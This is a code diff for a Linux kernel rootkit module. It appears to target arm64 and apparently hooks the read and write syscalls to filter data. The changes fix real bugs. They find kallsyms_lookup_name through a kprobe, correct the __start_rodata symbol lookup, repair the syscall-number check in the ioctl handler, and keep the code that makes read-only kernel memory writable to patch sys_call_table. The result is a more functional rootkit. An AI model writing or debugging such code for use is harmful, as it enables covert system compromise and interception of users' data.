@@ -26,7 +26,9 @@ int noop_pre(struct kprobe *p, struct pt_regs *regs) {return 0;}
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name",
 };
-unsigned long (*kallsyms_lookup_name_func)(const char *name) = NULL;
+//unsigned long (*kallsyms_lookup_name_func)(const char *name) = NULL;
+typedef unsigned long (*kallsymsFn)(const char *);
+kallsymsFn kallsyms_lookup_name_func;
 static unsigned long *__sys_call_table;
 
 
@@ -160,7 +162,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         copy_from_user(&passing_infos, (struct filter_info *)arg, sizeof(passing_infos));
 
         // Check if syscall_nr = read or write
-        if(passing_infos.syscall_nr != __NR_read || passing_infos.syscall_nr != __NR_write)
+        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write)
         {
             printk("The passing syscall_nr does not support custom filtering.");
             break;
@@ -234,7 +236,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         copy_from_user(&passing_infos, (struct filter_info *)arg, sizeof(passing_infos));
 
         // Check if syscall_nr = read or write
-        if(passing_infos.syscall_nr != __NR_read || passing_infos.syscall_nr != __NR_write)
+        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write)
         {
             printk("The passing syscall_nr does not support custom filtering.");
             break;
@@ -284,6 +286,7 @@ static inline void protect_memory(void)
 
 static inline void open_memory(void)
 {
+    pr_info("start_rodata: %lx, init_begin: %lx\n", (unsigned long)start_rodata, (unsigned long)init_begin);
     update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin-start_rodata, PAGE_KERNEL);
 }
 
@@ -304,7 +307,7 @@ static int __init rootkit_init(void) {
     // Register kallsyms_lookup_name
     kp.pre_handler = noop_pre;
     register_kprobe(&kp);
-    kallsyms_lookup_name_func = (void *)kp.addr;
+    kallsyms_lookup_name_func = (kallsymsFn)kp.addr;
     unregister_kprobe(&kp);
     printk(KERN_INFO "Address of kallsyms_lookup_name_func: %p\n", kallsyms_lookup_name_func);
 
@@ -315,17 +318,15 @@ static int __init rootkit_init(void) {
 
     // Get some hidden variables via kallsyms_lookup_name 
     __sys_call_table = (unsigned long *)kallsyms_lookup_name_func("sys_call_table");
-    printk("Hello!!!!!!");
     update_mapping_prot = (void *)kallsyms_lookup_name_func("update_mapping_prot");
-    printk("Hello!!!!!!");
-    start_rodata = (unsigned long)kallsyms_lookup_name_func("__start_ro_data");
-    printk("Hello!!!!!!");
+    start_rodata = (unsigned long)kallsyms_lookup_name_func("__start_rodata");
     init_begin = (unsigned long)kallsyms_lookup_name_func("__init_begin");
 
 
     // Store the original syscall
     original_read = (sys_call_t)__sys_call_table[__NR_read];
     original_write = (sys_call_t)__sys_call_table[__NR_write];
+    printk("Hello!!!!!!");
 
     // Change to my custom filtered function
     open_memory();
